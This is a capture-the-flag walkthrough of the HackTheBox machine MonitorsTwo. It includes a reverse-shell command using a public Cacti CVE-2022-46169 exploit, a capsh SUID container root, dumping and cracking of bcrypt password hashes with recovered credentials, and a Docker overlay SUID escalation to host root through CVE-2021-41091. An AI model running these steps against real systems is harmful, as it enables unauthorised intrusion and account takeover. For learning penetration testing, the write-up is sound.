---
title: MonitorsTwo
tags:
  - HackTheBox
  - Easy
  - Linux
  - Cacti
  - RCE
  - SUID
  - CVE
  - Moby
  - Docker
date: 2025-02-07T00:00:00Z
---
![](Pasted%20image%2020250207173109.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.211 monitorstwo.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- monitorstwo.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http
|_http-title: Login to Cacti
```

So I checked its website:

![](Pasted%20image%2020250207173243.png)

I spotted Cacti CMS v1.2.22 in use.

## Weaponization

> [!Info]
> *Cacti is an open-source, web-based network monitoring, performance, fault and configuration management framework designed as a front-end application for the open-source, industry-standard data logging tool RRDtool.*

So I searched for "*cacti 1.2.22 exploit*" and found [CVE-2022-46169](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/blob/main/CVE-2022-46169.py)

## Exploitation

I executed the script:

```shell
python3 exploit.py -u http://monitorstwo.htb -LHOST=10.10.14.21 -LPORT=666
```

![](Pasted%20image%2020250207175054.png)

> I got a shell :D

## Privilege Escalation (Inside Docker Container)

I found a script called `entripoint.sh` at `/`:

```shell
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```

I also know that I'm inside a container because of `.dockerenv`:

```shell
-rwxr-xr-x   1 root root     0 Mar 21  2023 .dockerenv
```

Let's search for files with the SUID bit set:

```shell
find / -perm /4000 2>/dev/null

/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
```

I found info of it and got [GTFOBins](https://gtfobins.github.io/gtfobins/capsh/) bypass:

```shell
capsh --gid=0 --uid=0 --
```

![](Pasted%20image%2020250207180641.png)

> I became root :D

## Pivoting (to the Host machine)

I got database credentials inside `/var/www/html/include/config.php`:

![](Pasted%20image%2020250207181456.png)

So I can now login to the Cacti database with `root:root`:

```shell
mysql -h db -u root -proot cacti -e 'show tables;'

[redacted]
user_auth

mysql -h db -u root -proot cacti -e 'select * from user_auth;'

[redacted]
admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC  
marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
```

Seems to be bcrypt encrypted, so I'll use Hashcat to bruteforce the passwords:
- Check [Crack Password Hashes (Sites) 🤡](/notes/crack_password_hashes.md)

```shell
hashcat -m 3200 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt

[redacted]
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
```

> Now I've got creds for ssh :D `marcus:funkymonkey`

### User flag

I can ssh the machine and get user flag:

![](Pasted%20image%2020250207182511.png)

## Privilege Escalation

After some enumeration inside the machine I found a long message inside `/var/mail/marcus`:

```txt
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

To check if the OS is still being vulnerable I'll run the following:

```shell
uname -r

5.4.0-147-generic
```

It's not vulnerable :/

Investigating the CVE-2021-41091 directs me to a blog, which in turn refers to a GitHub commit that briefly explains the vulnerability. In essence, several directories within `/var/lib/docker`, which are mounted on and utilised by Docker containers, are accessible by low-privileged users. This implies that if an attacker gains root access inside a container, they could create arbitrary SUID files that an unprivileged user outside the container could interact with and use to elevate their privileges. We can employ **findmnt** to display the mounts connected to the system, including those used by Docker containers:

```shell
findmnt

[redacted]
TARGET                                SOURCE      FSTYPE  OPTIONS
/                                     /dev/sda2   ext4    rw,relatime
├─/sys                                sysfs       sysfs   rw,nosuid,nodev,noexec,relat
│ ├─/sys/kernel/security              securityfs  securit rw,nosuid,nodev,noexec,relat
│ ├─/sys/fs/cgroup                    tmpfs       tmpfs   ro,nosuid,nodev,noexec,mode=
│ │ ├─/sys/fs/cgroup/unified          cgroup2     cgroup2 rw,nosuid,nodev,noexec,relat
│ │ ├─/sys/fs/cgroup/systemd          cgroup      cgroup  rw,nosuid,nodev,noexec,relat
│ │ ├─/sys/fs/cgroup/rdma             cgroup      cgroup  rw,nosuid,nodev,noexec,relat
│ │ ├─/sys/fs/cgroup/cpu,cpuacct      cgroup      cgroup  rw,nosuid,nodev,noexec,relat
│ │ ├─/sys/fs/cgroup/perf_event       cgroup      cgroup  rw,nosuid,nodev,noexec,relat
│ │ ├─/sys/fs/cgroup/hugetlb          cgroup      cgroup  rw,nosuid,nodev,noexec,relat
│ │ ├─/sys/fs/cgroup/memory           cgroup      cgroup  rw,nosuid,nodev,noexec,relat
│ │ ├─/sys/fs/cgroup/devices          cgroup      cgroup  rw,nosuid,nodev,noexec,relat
│ │ ├─/sys/fs/cgroup/cpuset           cgroup      cgroup  rw,nosuid,nodev,noexec,relat
│ │ ├─/sys/fs/cgroup/net_cls,net_prio cgroup      cgroup  rw,nosuid,nodev,noexec,relat
│ │ ├─/sys/fs/cgroup/pids             cgroup      cgroup  rw,nosuid,nodev,noexec,relat
│ │ ├─/sys/fs/cgroup/blkio            cgroup      cgroup  rw,nosuid,nodev,noexec,relat
│ │ └─/sys/fs/cgroup/freezer          cgroup      cgroup  rw,nosuid,nodev,noexec,relat
│ ├─/sys/fs/pstore                    pstore      pstore  rw,nosuid,nodev,noexec,relat
│ ├─/sys/fs/bpf                       none        bpf     rw,nosuid,nodev,noexec,relat
│ ├─/sys/kernel/debug                 debugfs     debugfs rw,nosuid,nodev,noexec,relat
│ ├─/sys/kernel/tracing               tracefs     tracefs rw,nosuid,nodev,noexec,relat
│ ├─/sys/kernel/config                configfs    configf rw,nosuid,nodev,noexec,relat
│ └─/sys/fs/fuse/connections          fusectl     fusectl rw,nosuid,nodev,noexec,relat
├─/proc                               proc        proc    rw,nosuid,nodev,noexec,relat
│ └─/proc/sys/fs/binfmt_misc          systemd-1   autofs  rw,relatime,fd=28,pgrp=1,tim
│   └─/proc/sys/fs/binfmt_misc        binfmt_misc binfmt_ rw,nosuid,nodev,noexec,relat
├─/dev                                udev        devtmpf rw,nosuid,noexec,relatime,si
│ ├─/dev/pts                          devpts      devpts  rw,nosuid,noexec,relatime,gi
│ ├─/dev/shm                          tmpfs       tmpfs   rw,nosuid,nodev
│ ├─/dev/mqueue                       mqueue      mqueue  rw,nosuid,nodev,noexec,relat
│ └─/dev/hugepages                    hugetlbfs   hugetlb rw,relatime,pagesize=2M
├─/run                                tmpfs       tmpfs   rw,nosuid,nodev,noexec,relat
│ ├─/run/lock                         tmpfs       tmpfs   rw,nosuid,nodev,noexec,relat
│ ├─/run/docker/netns/6070a2ae2526    nsfs[net:[4026532570]]
│ │                                               nsfs    rw
│ ├─/run/user/1000                    tmpfs       tmpfs   rw,nosuid,nodev,relatime,siz
│ └─/run/docker/netns/c9d3320c69b8    nsfs[net:[4026532631]]
│                                                 nsfs    rw
├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
│                                     overlay     overlay rw,relatime,lowerdir=/var/li
├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
│                                     shm         tmpfs   rw,nosuid,nodev,noexec,relat
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
│                                     overlay     overlay rw,relatime,lowerdir=/var/li
└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
```

The output displays four Docker-related file systems nested in the `/var/lib/docker` directory. To execute the exploit, we need to determine which of these belongs to the container running the Cacti service, where we previously obtained a root shell. To achieve this, we return to the containerised shell and list the container's mounts:

```shell
mount

[redacted]
(rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker/overlay2/l/CXAW6LQU6QOKNSSNURRN2X4JEH:/var/lib/docker/overlay2/l/YWNFANZGTHCUIML4WUIJ5XNBLJ:/var/lib/docker/overlay2/l/JWCZSRNDZSQFHPN75LVFZ7HI2O:/var/lib/docker/overlay2/l/DGNCSOTM6KEIXH4KZVTVQU2KC3:/var/lib/docker/overlay2/l/QHFZCDCLZ4G4OM2FLV6Y2O6WC6:/var/lib/docker/overlay2/l/K5DOR3JDWEJL62G4CATP62ONTO:/var/lib/docker/overlay2/l/FGHBJKAFBSAPJNSTCR6PFSQ7ER:/var/lib/docker/overlay2/l/PDO4KALS2ULFY6MGW73U6QRWSS:/var/lib/docker/overlay2/l/MGUNUZVTUDFYIRPLY5MR7KQ233:/var/lib/docker/overlay2/l/VNOOF2V3SPZEXZHUKR62IQBVM5:/var/lib/docker/overlay2/l/CDCPIX5CJTQCR4VYUUTK22RT7W:/var/lib/docker/overlay2/l/G4B75MXO7LXFSK4GCWDNLV6SAQ:/var/lib/docker/overlay2/l/FRHKWDF3YAXQ3LBLHIQGVNHGLF:/var/lib/docker/overlay2/l/ZDJ6SWVJF6EMHTTO3AHC3FH3LD:/var/lib/docker/overlay2/l/W2EMLMTMXN7ODPSLB2FTQFLWA3:/var/lib/docker/overlay2/l/QRABR2TMBNL577HC7DO7H2JRN2:/var/lib/docker/overlay2/l/7IGVGYP6R7SE3WFLYC3LOBPO4Z:/var/lib/docker/overlay2/l/67QPWIAFA4NXFNM6RN43EHUJ6Q,upperdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff,workdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/work,xino=off)
```

The Cacti container's file system name begins with `c41d58...` , indicating which mountpoint to cd into on the host shell. Now set up bash SUID permissions:

```shell
chmod u+s /bin/bash
```

If we now attempt to navigate to the merged mount on the host, we can successfully access the contents of the docker container:

```shell
cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged && ls -al
```

We have successfully accessed the container's filesystem, verifying that the system is in fact vulnerable to the **Moby** CVE. Now, if we create a file within the container in the `/` directory, we can see that it also exists on the host system. Inside the container, we execute: 

```shell
touch test.py
```

Then we verify its existence on the host.

![](Pasted%20image%2020250207190036.png)

The file exists and is owned by root .

Next, we attempt to copy `/bin/bash` to the / directory and apply SUID permissions within the container. Then, on the host, we try to execute the copied bash SUID , which would allow us to have the Effective User ID ( EUID ) of the root user on the host system, which would be sufficient to read the root flag. We run the following two commands inside the container: 

```shell
cp /bin/bash / 
chmod u+s /bash
```

The file is visible, has the SUID bit set, and is owned by root . Lastly, we use the modified binary to escalate our privileges.

### Root flag

![](Pasted%20image%2020250207190337.png)

==Machine pwned!==

